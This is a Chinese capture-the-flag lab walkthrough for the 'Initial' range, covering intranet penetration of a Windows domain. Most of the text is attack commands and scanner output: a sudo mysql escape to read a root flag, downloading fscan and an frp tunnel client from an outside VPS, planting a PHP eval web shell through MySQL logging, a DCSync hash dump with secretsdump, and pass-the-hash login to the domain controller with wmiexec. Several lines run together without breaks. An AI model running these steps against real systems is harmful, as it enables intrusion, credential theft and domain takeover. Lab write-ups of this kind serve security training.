# 春秋云镜-Initial-WriteUp

> 原文: https://www.ctfiot.com/148520.html
> ID: 148520

：声明：该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关

现在只对常读和星标的公众号才展示大图推送，建议大家把猫蛋儿安全“设为星标”，否则可能看不到了！

靶场简介

Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。

获取入口机权限

./fscan_darwin -h 39.98.209.209

sudo -lsudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'

内网横向

curl http://39.98.170.21:
8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24

172.22.1.18:
3306 open172.22.1.18:
445 open172.22.1.21:
445 open172.22.1.2:
445 open172.22.1.18:
139 open172.22.1.21:
139 open172.22.1.2:
139 open172.22.1.18:
135 open172.22.1.21:
135 open172.22.1.15:22 open172.22.1.2:
135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:
200 len:
5578 title:
Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:
302 len:0 title:
None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:
200 len:
4012 title:
信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1

curl http://vpsip:
8001/frpc --output frpccurl http://vpsip:
8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini

show variables like 'general%';查看是否开启日志以及存放的日志位置

set global general_log = ON;开启日志set global general_log_file = "c:/phpStudy/PHPTutorial/www/1.php"select '<?php eval($_POST[shell]);?>'

XIAORANG-WIN7$/d4df8a3fa73a9fee14a62123784290c6

python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :
d4df8a3fa73a9fee14a62123784290c6

python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :
10cf89a850fb1cdbe6bb432b859164c8

关于我们

持续从基础到深入的更新攻防文章

点个小赞你最好看


```
./fscan_darwin -h 39.98.209.209
sudo -lsudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'
curl http://39.98.170.21:
8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24
172.22.1.18:
3306 open172.22.1.18:
445 open172.22.1.21:
445 open172.22.1.2:
445 open172.22.1.18:
139 open172.22.1.21:
139 open172.22.1.2:
139 open172.22.1.18:
135 open172.22.1.21:
135 open172.22.1.15:22 open172.22.1.2:
135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:
200 len:
5578 title:
Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:
302 len:0 title:
None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:
200 len:
4012 title:
信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
curl http://vpsip:
8001/frpc --output frpccurl http://vpsip:
8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini
show variables like 'general%';查看是否开启日志以及存放的日志位置
set global general_log = ON;开启日志set global general_log_file = "c:/phpStudy/PHPTutorial/www/1.php"select '<?php eval($_POST[shell]);?>'
XIAORANG-WIN7$/d4df8a3fa73a9fee14a62123784290c6
python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :
d4df8a3fa73a9fee14a62123784290c6
python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :
10cf89a850fb1cdbe6bb432b859164c8
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1701394068.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1701394068.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1701394068.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/10-1701394069.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1701394069.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1701394069.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/10-1701394070.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/10-1701394071.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/9-1701394072.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/4-1701394072.png)